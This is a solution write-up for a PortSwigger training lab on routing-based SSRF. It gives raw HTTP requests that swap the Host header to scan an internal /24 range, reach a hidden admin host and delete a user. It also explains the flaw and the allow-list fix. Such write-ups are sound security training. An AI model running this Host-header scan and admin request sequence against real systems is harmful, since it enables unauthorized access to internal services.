# PortSwigger Lab: Routing-based SSRF

- **Lab Name:** Routing-based SSRF
- **Topic:** HTTP Host Header Attacks
- **Vulnerability Type:** Server-Side Request Forgery (SSRF) via Host header routing
- **Difficulty:** Practitioner
- **Status:** Solved (banner-verified 27 Nov 2026)
- **Instance:** https://0aac00c9036ba57280f26211005a0024.web-security-academy.net/

## Solution

The front-end server routes requests to back-end hosts by the HTTP `Host`
header, and it will route to hosts on the internal network
(`192.168.0.0/24`) that are not reachable from the internet. Scanning that
range with the `Host` header finds the internal admin host, which redirects
to its own `/admin` — from there carlos can be deleted like in the other
Host Header labs.

### Step 1 — Scan the internal range

For each address `192.168.0.0` … `192.168.0.255`, send the lab's home page
request with the Host header replaced by that address:

```
GET / HTTP/1.1
Host: 192.168.0.<n>
Cookie: session=<session>; _lab=<lab cookie>
```

Most addresses return 404 / no route. One address — **192.168.0.232** —
returns **HTTP 302 to `/admin`**. That is the internal admin host: the
front-end routed the request to it, and the admin host redirected to its
admin page.

### Step 2 — Open the admin panel

```
GET /admin HTTP/1.1
Host: 192.168.0.232
Cookie: session=<session>; _lab=<lab cookie>
```

Response is HTTP 200 and contains the admin "Delete user" form
(`action='/admin/delete'` with a hidden CSRF token). Note: this page
contains **no literal "Admin panel" text** — the delete form itself is the
marker that the internal admin host was reached. (An earlier solver run
failed only because it checked for the string "Admin panel"; the check was
fixed to look for `/admin/delete`.)

### Step 3 — Delete carlos

```
POST /admin/delete HTTP/1.1
Host: 192.168.0.232
Cookie: session=<session>; _lab=<lab cookie>
Content-Type: application/x-www-form-urlencoded

csrf=<token from the admin form>&username=carlos
```

Response is HTTP 302 (redirect after deleting carlos) and the home page
then shows **"Congratulations, you solved the lab!"**.

All of this is automated in `~/workspace/scripts/ps-host-header.py`
(`lab4`).

## Practical Explanation

This is an SSRF caused by routing on an unvalidated Host header. The
front-end treats the Host header as an instruction for which back-end to
talk to, and it does not restrict that choice to public hosts — so an
attacker can point it at any host on the internal network, including the
admin host at `192.168.0.232`, which the internet can never reach directly.
The scan is the same idea as a port scan, only the "port" is the Host
header: one address in the /24 answers with a redirect to `/admin`, and
from there the admin delete endpoint is exposed. In the real world this
class of bug exposes internal admin panels, dashboards and metadata
services — the fix is to route only to an allow-list of public hosts and
never to internal addresses from a client-supplied header.

## Lessons Learned

- **Scan the whole /24, don't guess.** The admin host is one of 256
  addresses (here `192.168.0.232`); it changes per instance, so the scan
  has to run every time.
- **A 302 to `/admin` is the signal.** The admin host announces itself by
  redirecting to its admin page — any other response (404 / timeout) means
  "not the admin host".
- **Check for the functional marker, not a guessed label.** The admin page
  has no "Admin panel" heading — the delete form (`/admin/delete`) is what
  proves access. A wrong string check turned a working exploit into a
  false "NOT SOLVED".
- **Instances expire fast.** This lab's first instance died (HTTP 504)
  before the scan finished; the solve used a fresh instance launched the
  same morning. If the scan returns nothing on every address, check the
  instance is still alive before assuming the lab is hard.
